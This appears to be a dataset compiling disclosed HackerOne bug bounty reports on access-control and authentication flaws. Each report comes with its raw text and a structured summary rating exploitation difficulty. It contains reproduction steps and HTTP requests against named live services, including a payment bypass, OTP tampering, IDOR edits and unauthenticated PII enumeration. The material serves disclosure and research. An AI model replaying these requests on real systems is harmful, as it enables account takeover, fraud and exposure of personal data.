A victim could be tricked into visiting a link, opening a file, or sending PII to the attacker via the incident. Because the attacker opened the incident, they can see all comments left by the victim.
Step-by-step Reproduction Instructions
Browse to ████ and create an account or login.
Browse to ██████████/█████████. You will be able to create an incident on this page.
In the █████████ field, you can select any user you want to assign the incident to. The i button beside the caller field also allows you to view various PII about the user. ███████ ██████
You can attach files in the top right corner using the attachment button.
Once you have chosen a victim (██████) and filled in the additional comments section with your phishing message, you can click Submit in the top right corner. ██████
Browse to ███████/home.do and you can see a list of your open incidents. You may need to filter by All.
Click the incident that you assigned to the victim. ███████
You can now use this page to monitor the victims response. This could be used to communicate with the victim, posing as an administrator and soliciting PII or causing other malicious effects. █████████
The victim will receive an e-mail that the incident has been submitted on their behalf. Once they log-in, they will see the following: ██████████ ███████
Obviously an adversary would create an account posing as an Air University administrator or something believable, but here is what a phishing attempt could look like using this vulnerability: ███
Meanwhile, the attacker is monitoring the incident waiting on the victim to respond and can even see when the victim has viewed the incident. ███
Suggested Mitigation/Remediation Actions
This feature should be locked down to administrative access only. Regular users should not be allowed to submit tickets directly to other users or view other users PII.
Impact
A victim could be tricked into visiting a link, opening a file, or sending PII to the attacker via the incident. Because the attacker opened the incident, they can see all comments left by the victim.



================================================================================
Vulnerability Description:
A malicious user can open a support incident for any user, potentially tricking the victim into clicking malicious links or revealing PII. The attacker can also view PII via the caller field and monitor all victim responses.

Steps to Reproduce:
1. Browse to the application and create an account or log in.
2. Navigate to the incident creation page (/█████████/█████████).
3. In the █████████ field, select any user to assign the incident to.
4. Attach files and fill in the comments section with a phishing message.
5. Click Submit to create the incident.
6. Monitor the incident page to track the victim's response.
Exploitation Difficulty:
The vulnerability involves straightforward steps without complex interactions or novel logic. The attacker simply exploits a lack of access control on the incident creation feature.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/915110: No Email Checking at Invitation Confirmation Link leads to Account Takeover without User Interaction at CrowdSignal
================================================================================
RAW DESCRIPTION:

Summary:
<image_0>
Steps To Reproduce:
Go to https://app.crowdsignal.com/users/list-users.php with your team account
Invite an existing email (write victim's email)
And click to confirmation link with your account
You will log-in to victim's account directly
PoC video :
Impact
Account Takeover without user interaction
Thanks,
Bugra



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to take over a victim's account by simply clicking on the confirmation link of an invitation sent to the victim's email, without any interaction from the victim. This bypasses the usual email verification step, leading to an account takeover.

Steps to Reproduce:
1. Go to https://app.crowdsignal.com/users/list-users.php with your team account
2. Invite an existing email (write victim's email)
3. Click to confirmation link with your account
4. You will log-in to victim's account directly
Exploitation Difficulty:
The vulnerability involves a straightforward process of inviting an existing user and clicking a confirmation link, without requiring complex interactions or understanding of subtle application behaviors. The flaw is in the lack of proper email verification before account access is granted.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/951230: Can buy Atavist Magazine subscription for free
================================================================================
RAW DESCRIPTION:

Summary:
Hi team
If you go to https://magazine.atavist.com/ and scroll down. You will see membership price is $25, but I found a way to buy this subscription for free via Gift feature.
When you send gift request before adding any credit card to your account you will see this response :
<image_0>
However, if you check the gift recipient's email you will see the Gift email that contains the gift link.
<image_1>
Steps To Reproduce:
Just send this request (change YOUR_EMAIL, YOUR_PASSWORD, RECIPIENT_EMAIL, gift_timestamp to current date, it was 2020-8-4 while reporting this) :
Code 670 Bytes
1POST /api/v2/store/purchase.php HTTP/1.1
2Host: magazine.atavist.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
4Accept: application/json, text/javascript, */*; q=0.01
5Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
6Accept-Encoding: gzip, deflate
7Content-Type: application/x-www-form-urlencoded; charset=UTF-8
8Content-Length: 204
9Origin: https://magazine.atavist.com
10DNT: 1
11Connection: close
12Referer: https://magazine.atavist.com/
13
14email=YOUR_EMAIL&password=YOUR_PASSWORD&product_id=com.theatavist.atavist.subscription.membership&gift_timestamp=2020-8-4&gift_recipient=RECIPIENT_EMAIL&gift_message=test&gift_gifter=test
You will see {"error":"invalid_request_error","error_description":"The customer must have an active payment source attached."} in response but if you check the recipient's email, you will see the gift link.
Impact
Able to buy magazine membership for free
Thanks,
Bugra



================================================================================
Vulnerability Description:
The vulnerability allows users to obtain a free subscription to Atavist Magazine by exploiting the gift feature. By sending a gift request without an active payment source, the system generates a gift link in the recipient's email, bypassing the payment requirement.

Steps to Reproduce:
1. Go to https://magazine.atavist.com/ and scroll down to see the membership price of $25.
2. Send a gift request without adding any credit card to your account using the provided POST request, changing the placeholders (YOUR_EMAIL, YOUR_PASSWORD, RECIPIENT_EMAIL, gift_timestamp) to appropriate values.
3. Check the recipient's email to find the gift link, despite receiving an error response ('The customer must have an active payment source attached.')
Exploitation Difficulty:
The vulnerability involves a simple bypass of the payment check during the gift request process. The interaction between the gift request and the email generation is straightforward, and the steps to reproduce are not complex. The main challenge is knowing to check the recipient's email despite the error message.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/992618: Improper Access Control - Generic on https://████
================================================================================
RAW DESCRIPTION:

Greetings, I found on one of your sub-domains some tickets that are not supposed to be readable by everyone, we even have the possibility to delete the tickets.
Link :
https://███/█████/latest
https://█████/███████/all
https://█████/███████ (DELETE HEADER METHOD)
Best regards,
frenchvlad
Impact
a malicious person can delete tickets and see the progress of tickets in progress



================================================================================
Vulnerability Description:
The vulnerability involves improper access control on a sub-domain, allowing unauthorized users to view and delete tickets. This exposes sensitive ticket information and allows malicious actors to disrupt operations by deleting tickets.

Steps to Reproduce:
1. Navigate to the sub-domain URLs provided in the report: https://███/█████/latest and https://█████/███████/all
2. Attempt to delete a ticket by sending a DELETE request to https://█████/███████ with the appropriate headers
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves accessing publicly available URLs and performing basic HTTP methods. No complex interactions or state manipulations are required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/999765: Ticket Trick at https://account.acronis.com
================================================================================
RAW DESCRIPTION:

Summary
Hello dear team,
I found a serious issue in Acronis
This vulnerability is called ticket trick vulnerability which comes under critical category. Which can allow me to login on websites like atlassian,github,clouflare,choopa,..etc on behalf of support_mobility@acronis.com .
Steps To Reproduce
Lets take an example to get your github account.
As Github send account register verification mails from noreply@github.com
I registered an account on acronis with same email.
Now your support system creates ticket of emails sent to support_mobility@acronis.com .
So I registered an account on github and logged into my acronis account with email noreply@github.com .
As Acronis allowed me to see support tickets without email verification , so I was able to see support tickets easily created by noreply@acronis.com .
On support ticket there was an email verification link sent to noreply@github.com .
In this way I was able to takeover many account registered with support_mobility@acronis.com and many internal accounts that can be accessed with only @acronis.com
POC
I was able to register a github account on your email address :-
<image_0>
Resources about this vulnerability:-
https://hackerone.com/reports/498964
https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
Impact
Critical Email Takeover
Ticket Trick
Thanks for reading my report.
Best Regards
Sayaan Alam



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to register an account on Acronis using an email address that matches the sender of verification emails (e.g., noreply@github.com). By doing so, the attacker can access support tickets sent to support_mobility@acronis.com without email verification, including verification links, enabling account takeover.

Steps to Reproduce:
1. Register an account on Acronis with the email noreply@github.com.
2. Log into the Acronis account and access the support tickets without email verification.
3. Find the email verification link in the support tickets sent to noreply@github.com.
4. Use the verification link to take over accounts registered with support_mobility@acronis.com.
Exploitation Difficulty:
The attack involves understanding the interaction between email verification processes and support ticket systems, but the steps are straightforward once the initial insight is gained. The vulnerability relies on the non-obvious interaction between registering with a specific email and accessing unverified support tickets.

--------------------------------------------------------------------------------



Authentication Bypass Using an Alternate Path or Channel Vulnerabilities (3 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1063298: Unauthorized access to employee panel with default credentials.
================================================================================
RAW DESCRIPTION:

Summary:
Hello,
When hunting for your web application.
I have managed to go https://cars.fas.gsa.gov/cars/cars and get displayed with a form.
I have already tried to login to Cars and without success.
However i've noticed the loginChk() function and change the value of the form hence bypassing it and logging in succesfuly.
Steps To Reproduce:
go to https://cars.fas.gsa.gov/cars/cars
type loginChk() function in console.
It would return false.
Now type in console ( can be opened using F12). document.forms[0].scSelCen.value = "admin"
Now try to login by clicking on CARS button.
Supporting Material/References:
Navigator used : google chrome.
If you need any additional information. feel free to ask me.
PS : I think the website went for a maintenance right now.
Even though i didn't use anything of that panel.
Impact
Any attacker would have the access to admin panel and do whatever he wants.
As i can see , it's a platform for reporting accidents.



================================================================================
Vulnerability Description:
The vulnerability allows unauthorized access to the employee panel by manipulating the form values via client-side JavaScript, bypassing authentication checks. The loginChk() function can be overridden, and default credentials can be injected to gain admin access.

Steps to Reproduce:
1. Navigate to https://cars.fas.gsa.gov/cars/cars
2. Open the browser's developer console (F12) and execute the following commands:
   - `loginChk()` (should return false)
   - `document.forms[0].scSelCen.value = "admin"`
   - Click the 'CARS' button to login
Exploitation Difficulty:
The attack involves minimal components (a single form manipulation) and relies on straightforward client-side JavaScript execution. There are no complex interactions or state manipulations required, and the logic is common in poorly secured web applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1709881: Authentication Bypass Leads To  Complete Account TakeveOver on ██████████
================================================================================
RAW DESCRIPTION:

Summary:
Hello Team,
When an invalid email address/password is entered, the Web Application will not authenticate the user. But nevertheless, it is conceivable for an attacker to get around authentication and log in as anyone else, leading to Complete Account Takeover.
Steps To Reproduce:
Create Two Test Account (Attacker & Victim)
Using attacker's account, login at ███████
Capture request with Burp.
Without sending request to "Burp Repeater", modify attacker's email to victim's email. For example REDACTED+██████ to REDACTED+█████.
Change the param value:false, to value:true, and click send.
Notice, attacker has successfully bypassed the authentication to login as the victim without any interaction.
Supporting Material/References:
███
Request
Code 467 Bytes
1POST /app/login HTTP/1.1
2Host: mtnmobad.mtnbusiness.com.ng
3Cookie: █████
4User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.27 Safari/537.36
5....snip....
6Connection: close
7{
8	"params":{
9		"updates":[
10		{
11			"param":"user",
12			"value":{
13				"userEmail":"REDACTED+██████",
14				"userPassword":"#######"
15				},
16				"op":"a"
17				},
18				{
19					"param":"gateway",
20					"value":true,
21					"op":"a"
22					}
23					],
24....more....
Response
Code 174 Bytes
1HTTP/1.1 200 OK
2Server: nginx
3....snip....
4{
5	"error":false,
6	"response":{
7		"id":"/703",
8	"name":"Victim ******",
9	"type":"Account",
10	"level":0,
11	"notes":{
12		},
13....more....
██████
[attachment / reference]
█████
██████
Impact
Supposing there are 100,000 users available, a malicious actor will enumerate all 100,000 emails for all users to achieve a mass account takeover. Additionally, an attacker can lockdown an account, delete an account, change account info, and perform large data leaks.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to bypass authentication by modifying the email parameter and changing a boolean value in the request, leading to a complete account takeover without any interaction from the victim.

Steps to Reproduce:
1. Create two test accounts (Attacker & Victim).
2. Using the attacker's account, log in and capture the request with Burp.
3. Modify the attacker's email to the victim's email in the captured request.
4. Change the param value from 'false' to 'true' and send the request.
5. Observe that the attacker has successfully bypassed authentication and logged in as the victim.
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of request parameters without requiring deep understanding of complex application states or novel logic. The steps are linear and do not involve subtle interactions between components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2762462: Ability to Add and Verify Uncontrolled Mobile Numbers Leading to Account Takeover (ATO)
================================================================================
RAW DESCRIPTION:

Summary
A critical vulnerability was identified in the OTP verification process on the shop.mtn.ng platform, which allows attackers to add and verify mobile numbers that they do not control. By tampering with the OTP verification request, an attacker can link a victim's mobile number to their account. This leads to an Account Takeover (ATO) scenario where the attacker gains full access to the victim's account without owning or controlling the victim's phone number.
Steps to Reproduce
Initiate OTP Request
Begin the login or registration process on the platform.
Enter a valid mobile number (MSISDN) and request an OTP.
Capture OTP Verification Request
Use a proxy tool like Burp Suite or Caido to intercept the OTP verification request when submitting the OTP.
The intercepted request will look like this
Code 181 Bytes
1POST /mtn_otp/index/verification/ HTTP/2
2Host: shop.mtn.ng
3Content-Type: application/x-www-form-urlencoded
4Content-Length: 53
5
6ajax=1&action=verifyotp&msisdn=█████████&otp=█████████
Manipulate Server Response
Upon capturing the request, submit an incorrect OTP to receive the server's response
Code 96 Bytes
1{
2  "status": 400,
3  "message": "Invalid OTP",
4  "msisdn": "2347037855490",
5  "success": false
6}
Modify the response in the intercepted traffic to indicate a successful verification
Code 91 Bytes
1{
2  "status": 200,
3  "message": "success",
4  "msisdn": "2347037855490",
5  "success": true
6}
This will trick the client into thinking that the OTP was successfully verified, even though the OTP is incorrect.
The manipulated server response now grants full access to the victim's phone number account. Even though the OTP was incorrect, the altered response bypasses the verification, which could allow the attacker to log in as the target user.
NOTE I do not own this phone number at all and as you can see it is now linked to my account
<image_0>
Root Cause
The application fails to protect against the manipulation of the OTP verification response. The server does not perform integrity checks on the response sent back to the client, allowing attackers to alter it and bypass OTP verification entirely.
Impact
An attacker can exploit this flaw to hijack user accounts by manipulating the OTP verification response. This allows the attacker to
Access personal user information such as names, phone numbers, and email addresses.
Modify sensitive account settings like passwords, linked emails, and phone numbers.
Perform unauthorized actions such as transactions or purchases.
Further escalate the attack to other services connected to the victim's account.



================================================================================
Vulnerability Description:
A critical vulnerability in the OTP verification process allows attackers to add and verify mobile numbers they do not control by manipulating the server response. This leads to Account Takeover (ATO) by bypassing OTP verification.

Steps to Reproduce:
1. Initiate OTP Request: Begin the login or registration process on the platform and request an OTP for a valid mobile number.
2. Capture OTP Verification Request: Use a proxy tool like Burp Suite to intercept the OTP verification request when submitting the OTP.
3. Manipulate Server Response: Submit an incorrect OTP, intercept the response, and modify it to indicate a successful verification.
4. Bypass Verification: The manipulated response tricks the client into granting access to the victim's account without correct OTP validation.
Exploitation Difficulty:
The attack involves intercepting and modifying server responses, which is a straightforward process with proxy tools. The vulnerability stems from a lack of server-side integrity checks, a common oversight in OTP implementations.

--------------------------------------------------------------------------------



Improper Authorization Vulnerabilities (7 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1102365: [dubmash] Lack of authorization checks - Update Sound Titles
================================================================================
RAW DESCRIPTION:

Summary:
During the security testing, it has been observed that the UpdateSound api is vulnerable to IDOR. It allows an attacker to edit the victim's sound track titles. This vulnerability can be exploited using the sound track's uuid in the vulnerable request. This id is publicly known.
Steps To Reproduce:
Replay the vulnerable request using a valid authorization token.
Change the uuid parameter value with the victim's sound track UUID.
Victim's sound track title will be changed.
Vulnerable request:
curl -i -s -k -X $'POST' \
-H $'Host: gateway-production.dubsmash.com' -H $'X-Dmac: ' -H $'X-Remote-Config-Values: []' -H $'X-Time: 1613158267' -H $'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H $'X-Accept-Content-Language: en_IN' -H $'X-Device-Timezone: 19800' -H $'X-Device-Language: en' -H $'X-Device-Country: IN' -H $'X-Build-Number: 45431' -H $'Content-Length: 676' -H $'X-App-Version: 5.20.0' -H $'X-Platform: ios' -H $'Connection: close' -H $'Authorization: Bearer XXXXXX' -H $'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H $'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-Dmac-Version: 2' -H $'If-None-Match: W/\"88-IVjhmW06Njcacim4nwHnJNviYsE\"' \
-b $'cfduid=' \
--data-binary $'{\"query\":\"mutation UpdateSound($input: UpdateSoundInput!) {\n updateSound(input: $input) {\n typename\n sound {\n typename\n ...SoundFragment\n }\n }\n}\nfragment SoundFragment on Sound {\n typename\n uuid\n created_at\n sound\n name\n waveform_raw_data\n liked\n soundStatus: status\n creator {\n typename\n ...ContentCreatorFragment\n }\n share_link\n num_likes\n num_videos\n}\nfragment ContentCreatorFragment on User {\n typename\n username\n uuid\n date_joined\n followed\n has_invite_badge\n badges\n profile_picture\n}\",\"variables\":{\"input\":{\"uuid\":\"a687eb61ad814a09a8a85cedef7837f3\",\"name\":\"test12355556777\"}}}' \
$'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'
Impact
An attacker can change the title of the victim's sound track to some malicious title like accounthack or similar.



================================================================================
Vulnerability Description:
The UpdateSound API endpoint lacks proper authorization checks, allowing an attacker to modify the title of any sound track by simply changing the UUID in the request to that of the victim's sound track. This is an Insecure Direct Object Reference (IDOR) vulnerability.

Steps to Reproduce:
1. Obtain a valid authorization token for the Dubsmash application.
2. Send a POST request to the UpdateSound API endpoint with the victim's sound track UUID and a modified title in the payload.
Exploitation Difficulty:
The vulnerability is straightforward to exploit once the attacker has a valid authorization token and knows the victim's sound track UUID. The attack does not involve complex interactions or state manipulations, and the logic is common in applications with insufficient authorization checks.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1175980: [Transportation Management Services Solution 2.0] Improper authorization at  tmss.gsa.gov leads to data exposure of all registered users
================================================================================
RAW DESCRIPTION:

Summary:
Hi team!
I hope you are having a great Tuesday :)
Where: https://tmss.gsa.gov/
Who: Unathenticated users
Why: Improper Access Control at /tmssserver/api/public/customerregistration/{:id}/userId/
I found an endpoint (/tmssserver/api/public/customerregistration/{:id}/userId/) at https://tmss.gsa.gov/ (Transportation Management Services Solution (TMSS) 2.0) that leads to data exposure of all registerd user at the platform, including the following data:
Email address
Phone Number
Full Name
Secret question (If set)
Steps To Reproduce:
Go to https://tmss.gsa.gov/
Check that you are not authenticated.
Now browse to https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/ (You can replace 4750 by any other value between 0 and 4800)
<image_0>
This is how the request looks like. As you can see there is no cookie in the headers or authentication bearer.
Code 570 Bytes
1GET /tmssserver/api/public/customerregistration/4500/userId/ HTTP/1.1
2Host: tmss.gsa.gov
3Connection: close
4sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
5Accept: application/json, text/plain, */*
6sec-ch-ua-mobile: ?0
7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
8Sec-Fetch-Site: same-origin
9Sec-Fetch-Mode: cors
10Sec-Fetch-Dest: empty
11Referer: https://tmss.preprod-acqit.helix.gsa.gov/tmss/customerregistration
12Accept-Language: es-ES,es;q=0.9
13dnt: 1
14sec-gpc: 1
15
As the id is incremental note that this can be easily brute-forced to leak all the user's information.
https://tmss.gsa.gov/tmssserver/api/public/customerregistration/:id/userId/
I was not able to submit my user ID as I don't have one until my account gets approved, but using this endpoint you can check that my data is also being leaked here.
curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/"
<image_1>
Code 730 Bytes
1{"userRegisterId":192,"registrationType":"User","reportingOfficialId":1504,"agencyCode":"072","bureauCode":"00","firstName":"Alexandrio","lastName":"Wearehackerone","middleInitial":"C","title":"","addressLine1":"ThisIsMYAddress","addressLine2":"PoCAddress","city":"","stateId":null,"zip":"","zipSuffix":"","countryId":326,"phone":"6541112343","phoneExtension":"","email":"alexandrio+1@wearehackerone.com","accessRequested":"HHG","registrationStatus":"Confirm Pending","rejectReason":null,"confirmDate":null,"createdDate":"2021-04-26T22:51:08.000+0000","updateProgram":"Customer_Registration","updateId":null,"updateDate":"2021-04-26T22:51:08.000+0000","agencyName":null,"agencyBureauName":null,"stateName":null,"countryName":null}
If you have some questions regarding this feel free to ping me!
Bests,
@alexandrio
Impact
Data exposure (Emails, addresses, phone numbers, full names etc) of all registered user - Unauthenticated users



================================================================================
Vulnerability Description:
An improper access control vulnerability in the TMSS 2.0 platform allows unauthenticated users to access sensitive user data (email, phone number, full name, secret questions) by making direct requests to an unprotected API endpoint with incremental user IDs.

Steps to Reproduce:
1. Go to https://tmss.gsa.gov/
2. Browse to https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/ (replace 4750 with any value between 0 and 4800)
Exploitation Difficulty:
The vulnerability involves a simple direct API access with no authentication requirements or complex interactions between components. The only non-trivial aspect is recognizing the incremental ID pattern, which is a common vulnerability pattern.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1330529: Claiming the listing of a non-delivery restaurant through OTP manipulation
================================================================================
RAW DESCRIPTION:

Summary: Am able to claim any restaurant which is not claimed before.
Description: An endpoint POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2 sends OTP to the restaurant mobile no.
Request (Request:1) is -
Code 767 Bytes
1POST /restaurant-onboard-diy/v2/send-auto-claim-otp HTTP/2
2Host: www.zomato.com
3Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
4Content-Length: 58
5Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
6Accept: application/json, text/plain, */*
7X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXXXX
8Sec-Ch-Ua-Mobile: ?0
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
10Content-Type: application/json;charset=UTF-8
11Origin: https://www.zomato.com
12Sec-Fetch-Site: same-origin
13Sec-Fetch-Mode: cors
14Sec-Fetch-Dest: empty
15Referer: https://www.zomato.com/partner_with_us/ownership
16Accept-Encoding: gzip, deflate
17Accept-Language: en-US,en;q=0.9
18Connection: close
19
20{"number":"XXXXXXXXXX","isdCode":"+91","resId":"XXXXXXXXXX"}
which responses -
Code 70 Bytes
1{"status":"success","message":"OTP SENT","requestId":XXXXXXX,"code":2}
Here Attacker gains OTP on his own mobile no by changing the number & resId to his own restaurant.
By using the following request (Request:2) attacker is able to map his e-mail Id as Owner / Manager to Victim restaurant.
##Request:2
Code 760 Bytes
1POST /restaurant-onboard-diy/v2/verify-auto-claim-otp HTTP/2
2Host: www.zomato.com
3Cookie: XXXXXXXXXXXXXXXX
4Content-Length: 68
5Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
6Accept: application/json, text/plain, */*
7X-Zomato-Csrft: XXXXXXXXXXXXXXXXXXXXX
8Sec-Ch-Ua-Mobile: ?0
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
10Content-Type: application/json;charset=UTF-8
11Origin: https://www.zomato.com
12Sec-Fetch-Site: same-origin
13Sec-Fetch-Mode: cors
14Sec-Fetch-Dest: empty
15Referer: https://www.zomato.com/partner_with_us/ownership
16Accept-Encoding: gzip, deflate
17Accept-Language: en-US,en;q=0.9
18Connection: close
19
20{"verificationCode":XXX,"requestId":"XXXXXXXX","resId":"XXXXXXXXX"}
Here by changing the verificationCode - (Otp received on Attacker Mobile in response of Request :1 )& requestId (Response of request:1) and resId to Victim Restaurant. Request:2 maps e-mail id of Attacker to Victim restaurant.
Prerequisite - Attacker should have a restaurant page, mapped Mobile No With Email Id.
Note : - If any restaurant is not mapped owner / manager then claimed restaurant can be claimed
Impact
Claim a restaurant.



================================================================================
Vulnerability Description:
An attacker can claim ownership of an unclaimed restaurant by manipulating the OTP verification process. By sending an OTP to their own mobile number while specifying the victim's restaurant ID, they can bypass the intended verification flow and associate their email as the owner/manager of the victim's restaurant.

Steps to Reproduce:
1. Send a POST request to `/restaurant-onboard-diy/v2/send-auto-claim-otp` with the attacker's mobile number and the victim's restaurant ID (`resId`).
2. Use the OTP received on the attacker's mobile to send a POST request to `/restaurant-onboard-diy/v2/verify-auto-claim-otp` with the OTP, `requestId` from the first response, and the victim's `resId` to claim ownership.
Exploitation Difficulty:
The attack involves manipulating the OTP verification flow in a non-obvious way, requiring the attacker to understand the endpoint interactions and the lack of validation on the restaurant ID during the OTP process. However, the steps are relatively straightforward once the endpoints are identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1627980: Unauthenticated access to internal API at██████████.███.edu  [HtUS]
================================================================================
RAW DESCRIPTION:

Overview:
There are multiple API calls using which an attacker user is able to gain unauthenticated access to internal API████████.██████.edu via Azure API url appg3entcalapi.azurewebsites.net.
The access to█████.██████.edu is via microsoft and only allows internal users to access it.
The appg3entcalapi.azurewebsites.net is listed as the API under the javascript located at https://eventscalendar.████.edu/app.js
██████
Steps to reproduce:
(I) Vulnerable Request: Disclose PII of internal users-
Code 492 Bytes
1GET /api/person/Default.GetAllPersons HTTP/1.1
2Host: appg3entcalapi.azurewebsites.net
3Dnt: 1
4Upgrade-Insecure-Requests: 1
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
6Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
7Accept-Encoding: gzip, deflate
8Accept-Language: en-US,en;q=0.9
9Connection: close
10Content-Length: 2
11
12{}
Copy the above vulnerable request to your BURP repeater tab and fire the request.
Notice the 200 OK response disclosing the details.
██████████
(II) Vulnerable Request: Disclose adgroups & internal emails-
Code 408 Bytes
1GET /api/AdGroup HTTP/1.1
2Host: appg3entcalapi.azurewebsites.net
3Dnt: 1
4Upgrade-Insecure-Requests: 1
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
6Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
7Connection: close
8Content-Length: 2
9
10{}
Copy the above vulnerable request to your BURP repeater tab and fire the request.
Notice the 200 OK response disclosing the details.
█████
(III) Vulnerable Request:
Code 437 Bytes
1GET /api/EventType HTTP/1.1
2Host: appg3entcalapi.azurewebsites.net
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
5Accept-Encoding: gzip, deflate
6Accept-Language: en-US,en;q=0.9
7Connection: close
8Content-Length: 2
9
10{}
Copy the above vulnerable request to your BURP repeater tab and fire the request.
Notice the 200 OK response disclosing the details.
███████
Impact
Unauthenticated access to internal API at████.████████.edu



================================================================================
Vulnerability Description:
Unauthenticated access to internal API endpoints at 'appg3entcalapi.azurewebsites.net' allows attackers to retrieve sensitive information including PII of internal users, adgroups, internal emails, and event types without any authentication.

Steps to Reproduce:
1. Send a GET request to '/api/person/Default.GetAllPersons' on 'appg3entcalapi.azurewebsites.net' without authentication.
2. Observe the 200 OK response containing PII of internal users.
3. Send a GET request to '/api/AdGroup' on 'appg3entcalapi.azurewebsites.net' without authentication.
4. Observe the 200 OK response containing adgroups and internal emails.
5. Send a GET request to '/api/EventType' on 'appg3entcalapi.azurewebsites.net' without authentication.
6. Observe the 200 OK response containing event type details.
Exploitation Difficulty:
The vulnerability involves straightforward unauthenticated API calls without any complex interactions or state manipulations. The endpoints are directly accessible and do not require any advanced techniques to exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/736391: [HTA2] Authorization Bypass on https://██████ leaks confidential aircraft/missile information
================================================================================
RAW DESCRIPTION:

Summary:
There is an authorization bypass on https://██████ which allows a remote, unauthenticated attacker to bypass the "██████Single Sign-On" and view the application as an authenticated user.
Details:
The host at ████ uses Akamai as a load balancer and routes traffic back to an internal server:
Code 218 Bytes
1root@doggos:~# dig A ████
2-- snip --
3;; ANSWER SECTION:
4███. 2386	IN	CNAME	█████.
5████. 1554 IN CNAME ███.
6███████. 180 IN CNAME e1010.d.akamaiedge.akamai.█████████.
7e1010.d.akamaiedge.akamai.██████.	20 IN A	██████████
When attempting to hit the website, you are redirected to https://█████████/pool/sso/authenticate/l/2?m=GET&r=t&u=https%3A%2F%2F████████%2F and requires the visitor to authenticate via SSO.
However, I was able to find the Origin IP of this server. Hitting this Origin IP completely circumvents the ████████ SSO and allows the visitor to use the application as an authenticated user.
Steps To Reproduce:
Try visiting the application here: https://███. You'll see you are redirected to login via SSO.
█████████
Run the following command to verify that ████ is the Origin IP for █████████ by pulling the names from the SSL certificate:
Code 190 Bytes
1root@doggos:~#  true | openssl s_client -connect ██████:443 2>/dev/null | openssl x509 -noout -text | perl -l -0777 -ne '@names=/\bDNS:([^\s,]+)/g; print join("\n", sort @names);'
2
3█████████
Now visit the application: https://█████
You'll see that you can now use the application as an authenticated user by clicking through the sidebar:
███
You can search through past messages / updates on aircraft and missles here:
https://███/Guest/MessageSearch.aspx
Impact
Critical. A remote, unauthenticated attacker can view and download confidential information from this application. For instance, I clicked on one of the messages at https://████████/Guest/MessagesDetails.aspx and it downloaded a document containing sensitive information about some issues with some██████████:
█████████
████████
Best,
Corben Leo (@cdl)



================================================================================
Vulnerability Description:
An authorization bypass vulnerability exists on https://██████, allowing unauthenticated users to access confidential aircraft/missile information by directly connecting to the Origin IP, circumventing the SSO authentication.

Steps to Reproduce:
1. Visit the application at https://███ to observe the SSO redirect.
2. Use the command `dig A ████` to find the Origin IP of the server.
3. Verify the Origin IP by checking the SSL certificate with `openssl s_client -connect ██████:443`.
4. Access the application directly via the Origin IP at https://█████ to bypass SSO.
Exploitation Difficulty:
The vulnerability involves identifying the Origin IP through DNS and SSL certificate inspection, which is a straightforward process once the initial SSO bypass idea is conceived. The attack does not require complex interactions or state manipulations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/751299: Improper Authorization
================================================================================
RAW DESCRIPTION:

hi there ,
